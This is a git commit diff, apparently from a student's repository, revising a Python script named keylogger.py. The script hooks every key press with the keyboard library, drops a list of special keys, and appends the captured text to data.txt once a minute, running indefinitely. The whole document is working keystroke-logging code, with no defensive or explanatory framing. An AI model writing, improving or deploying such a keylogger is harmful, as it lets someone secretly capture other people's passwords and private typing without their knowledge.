b7efbbec832ff31b076e20535fdf85a5917998d7
anheruyr-commits <anheruyr@alumnos.alborfp.com>
2025-12-03 12:58:47 +0100

    keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,4 @@
 # pip install keyboard
-
 import threading
 
 import keyboard
@@ -7,28 +6,32 @@ import keyboard
 key_buffer = []
 buffer_lock = threading.Lock()
 
+# Lista de teclas especiales que NO quieres guardar
+IGNORED_KEYS = {
+    "shift", "ctrl", "alt", "caps lock", "backspace",
+    "tab", "enter", "esc", "up", "down", "left", "right"
+}
+
 def pressedKeys(key):
     with buffer_lock:
         if key.name == "space":
             key_buffer.append(" ")
-        else:
+        elif key.name not in IGNORED_KEYS:
             key_buffer.append(key.name)
 
 def write_buffer_to_file():
-
     global key_buffer
-
     threading.Timer(60.0, write_buffer_to_file).start()
 
     with buffer_lock:
         if not key_buffer:
             return
 
-        with open("data.txt", "a") as file:
+        with open("data.txt", "a", encoding="utf-8") as file:
             file.write("".join(key_buffer))
         
         key_buffer.clear()
+
 write_buffer_to_file()
 keyboard.on_press(pressedKeys)
 keyboard.wait()
-
